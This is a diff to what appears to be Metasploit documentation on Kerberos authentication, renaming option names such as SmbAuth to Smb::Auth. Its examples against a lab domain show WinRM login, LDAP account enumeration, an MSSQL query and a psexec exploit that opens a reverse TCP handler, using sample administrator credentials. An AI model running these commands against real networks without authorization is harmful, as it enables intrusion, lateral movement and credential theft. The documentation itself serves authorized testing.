@@ -19,7 +19,7 @@ Open a WinRM session:
 
 ```
 msf6 > use auxiliary/scanner/winrm/winrm_login
-msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrmauth=kerberos domaincontrollerrhost=192.168.123.13 winrmrhostname=dc3.demo.local domain=demo.local
+msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrm::auth=kerberos domaincontrollerrhost=192.168.123.13 winrm::rhostname=dc3.demo.local domain=demo.local
 
 [+] 192.168.123.13:88 - Received a valid TGT-Response
 [*] 192.168.123.13:5985   - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120604_default_192.168.123.13_mit.kerberos.cca_451736.bin
@@ -44,7 +44,7 @@ Query LDAP for accounts:
 
 ```
 msf6 > use auxiliary/gather/ldap_query
-msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldapauth=kerberos ldaprhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
+msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
 [*] Running module against 192.168.123.13
 
 [+] 192.168.123.13:88 - Received a valid TGT-Response
@@ -70,7 +70,7 @@ Running psexec against a host:
 
 ```
 msf6 > use exploit/windows/smb/psexec
-msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smbauth=kerberos domaincontrollerrhost=192.168.123.13 smbrhostname=dc3.demo.local domain=demo.local
+msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
 
 [*] Started reverse TCP handler on 192.168.123.1:4444
 [*] 192.168.123.13:445 - Connecting to the server...
@@ -93,7 +93,7 @@ Connect to a Microsoft SQL Server instance and run a query:
 
 ```
 msf6 > use auxiliary/admin/mssql/mssql_sql
-msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssqlauth=kerberos mssqlrhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
+msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
 [*] Reloading module...
 [*] Running module against 192.168.123.13
 
@@ -116,14 +116,14 @@ Kerberos authentication requires additional options to be set. Some of them are 
 is authenticating. For example, the PSexec module which operates over SMB would use the "SMB" prefix.
 
 Required options:
-* `${Prefix}Auth` -- The authentication modes this module supports. Set it to "kerberos" to use Kerberos authentication. i.e. `SmbAuth=kerberos`
-* `${Prefix}Rhostname` -- The hostname of the target system. This value should be either the hostname `WIN-MIJZ318SQH` or
-  the FQDN like `WIN-MIJZ318SQH.msflab.local`. i.e. `SmbRhostname=WIN-MIJZ318SQH.msflab.local`
+* `${Prefix}::Auth` -- The authentication modes this module supports. Set it to "kerberos" to use Kerberos authentication. i.e. `Smb::Auth=kerberos`
+* `${Prefix}::Rhostname` -- The hostname of the target system. This value should be either the hostname `WIN-MIJZ318SQH` or
+  the FQDN like `WIN-MIJZ318SQH.msflab.local`. i.e. `Smb::Rhostname=WIN-MIJZ318SQH.msflab.local`
 * `${Prefix}Domain` -- The domain name of the target system, e.g. `msflab.local`. i.e. `SmbDomain=msflab.local`
 * `DomainControllerRhost` -- The IP address of the domain controller to use for kerberos authentication. i.e. `DomainControllerRhost=192.168.123.13`
 
 Optional options:
-* `${Prefix}Krb5Ccname` -- The path to a CCACHE file to use for authentication. This is comparable to setting the
+* `${Prefix}::Krb5Ccname` -- The path to a CCACHE file to use for authentication. This is comparable to setting the
   `KRB5CCNAME` environment variable for other tools. If specified, the tickets it contains will be used. i.e. `KRB5CCNAME=/path/to/Administrator.ccache`
 * `KrbCacheMode` -- The cache storage mode to use, one of the following four options:
     * `none` -- No cache storage is used, new tickets are requested and no tickets are stored.
